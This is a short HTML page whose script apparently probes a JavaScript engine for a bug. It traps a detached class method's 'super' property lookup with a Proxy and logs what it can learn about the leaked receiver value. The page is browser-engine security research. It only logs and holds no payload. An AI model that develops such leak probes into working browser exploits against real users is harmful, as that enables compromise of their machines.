<!DOCTYPE html>
<html>
<body>
<pre id="log"></pre>
<script>
function log(msg) {
    document.getElementById('log').textContent += msg + '\n';
}

function leakReceiverViaSuperGet() {
    class Leaker {
        leak() {
            return super.secret;
        }
    }

    Leaker.prototype.__proto__ = new Proxy({}, {
        get(target, prop, leakedReceiver) {
            log(`[+] Proxy trap called for property "${prop}"`);

            try {
                log(`typeof receiver: ${typeof leakedReceiver}`);
            } catch (e) {
                log(`typeof threw: ${e.message}`);
            }

            try {
                log(`receiver.constructor: ${leakedReceiver.constructor}`);
            } catch (e) {
                log(`receiver.constructor threw: ${e.message}`);
            }

            try {
                log(`receiver instanceof Object: ${leakedReceiver instanceof Object}`);
            } catch (e) {
                log(`instanceof threw: ${e.message}`);
            }

            try {
                let keys = Object.keys(leakedReceiver);
                log(`Object.keys() => ${JSON.stringify(keys)}`);
            } catch (e) {
                log(`Object.keys threw: ${e.message}`);
            }

            try {
                let refl = Reflect.ownKeys(leakedReceiver);
                log(`Reflect.ownKeys() => ${JSON.stringify(refl)}`);
            } catch (e) {
                log(`Reflect.ownKeys threw: ${e.message}`);
            }

            return 0;
        }
    });

    const { leak } = Leaker.prototype;
    leak(); // trigger leak
}

leakReceiverViaSuperGet();
</script>
</body>
</html>
